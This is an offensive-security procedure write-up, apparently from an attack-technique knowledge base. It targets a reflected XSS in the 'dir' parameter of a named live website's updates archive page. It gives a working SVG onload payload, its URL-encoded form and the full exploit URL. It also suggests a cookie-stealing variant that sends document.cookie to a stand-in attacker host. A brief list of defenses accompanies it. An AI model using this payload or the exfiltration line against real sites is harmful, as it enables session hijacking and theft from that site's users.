---
tags:
  - xss
  - reflected-xss
  - url-parameter
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.400Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 4b6c1fb7-1207-4e97-8888-a40a0d8f9ee9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS-Injection-in-Updates-Archive-Directory-Parameter

## Summary

This procedure exploits a reflected XSS vulnerability in the MapsMarker.com updates archive page by injecting a JavaScript payload into the 'dir' URL parameter, causing immediate script execution upon page load in the victim's browser.

## Description

The vulnerability stems from insufficient input sanitization and output encoding for the 'dir' parameter in the /updates-pro/archive/ endpoint. User-controlled input is directly reflected into the HTML without escaping, allowing attackers to inject HTML tags and JavaScript. In a real attack, this could be used to steal cookies, redirect users, or display phishing forms. The target is a PHP-based web application accessible via HTTPS.

## Requirements

1. Web browser with developer tools for URL encoding and inspection
2. Access to the public MapsMarker.com website
3. Knowledge of JavaScript payloads and URL encoding

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for all URL parameters using libraries like OWASP ESAPI
- Apply Content Security Policy (CSP) headers to block inline scripts
- Use output encoding (e.g., htmlspecialchars in PHP) when rendering user input
- Monitor for anomalous JavaScript execution via Web Application Firewall (WAF) rules

## Objectives

1. Execute arbitrary JavaScript in the victim's browser
2. Demonstrate potential for session hijacking or data theft
3. Validate the vulnerability for reporting or exploitation

## Instructions

### Step 1: Prepare the Base URL

**Context**: Start with the legitimate archive page to identify the vulnerable parameter.

Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1

Inspect the page source to confirm 'dir' is reflected in HTML.

### Step 2: Craft and Inject Payload

**Context**: Encode and append the payload to break out of the context and inject a script tag.

Use a payload like '<svg onLoad=prompt(9)>'. URL-encode it to '%3Csvg%20onLoad%3Dprompt%289%29%3E'.

Construct the full URL: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3Csvg%20onLoad%3Dprompt%289%29%3E

Visit the URL in a browser.

> The payload executes on load, showing a prompt with '9'. In production, replace prompt(9) with malicious code like document.location='http://attacker.com/steal?cookie='+document.cookie.

### Step 3: Verify Execution

**Context**: Confirm the injection by checking for script execution and reflection.

Open browser console (F12) and reload. Look for the injected <svg> tag in the DOM and any console errors or alerts.

**Expected Output**: Prompt dialog appears; payload visible in page source.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
